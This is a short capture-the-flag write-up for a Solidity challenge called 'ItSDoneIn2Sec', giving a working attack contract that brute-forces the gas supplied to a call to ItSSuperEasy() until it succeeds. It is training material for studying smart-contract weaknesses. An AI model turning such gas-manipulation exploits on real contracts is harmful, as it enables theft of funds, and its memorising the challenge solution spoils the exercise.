# ItSDoneIn2Sec

## Solution

To validate these challenges, there are many possibilities the first one is by making a brute force, so testing many values of gas or calculating the consumption of gas of the contract until the condition of the gas left using the debugging of the contract.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/ItSDoneIn2Sec.sol";

contract ItSDoneIn2SecAttack {
    
    ItSDoneIn2Sec originalContract;
    
    constructor(address payable _originalContract) public {
        originalContract =ItSDoneIn2Sec(_originalContract);
    }
    
    function exploit() public {
        for (uint256 i = 0; i < 500; i++) {
            (bool ret, bytes memory data) = address(originalContract).call.gas(i + 984*10)(abi.encodeWithSignature('ItSSuperEasy()'));
            if (ret)
                break;
        }
    }
    
}
```